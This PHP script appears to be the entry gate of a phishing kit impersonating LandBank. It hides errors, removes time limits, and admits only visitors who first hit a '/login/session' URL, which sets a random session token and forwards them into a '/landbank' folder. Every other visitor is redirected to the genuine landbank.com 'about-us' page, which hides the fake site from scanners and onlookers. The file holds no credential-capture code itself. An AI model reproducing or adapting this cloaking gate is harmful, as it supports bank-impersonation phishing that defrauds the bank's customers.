<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
ini_set('memory_limit', '-1');
ini_set('max_execution_time', '0');
set_time_limit(0);
date_default_timezone_set('Asia/Manila');

$ref = $_SERVER['HTTP_REFERER'];
$dirconfig = "/landbank";
$req = $_SERVER['REQUEST_URI'];

if($req == "/login/session"){

    session_start();
    $_SESSION["x"] = strtoupper(substr(md5(rand()), 0, 7));
    header("Location: ".$dirconfig);
}

if($req == "/logout") {
    session_destroy();
    session_unset();
    header("Location: https://www.landbank.com/about-us");

}
if(empty($_SESSION["x"]) ){
    session_destroy();
    session_unset();
    header("Location: https://www.landbank.com/about-us");
    die();
}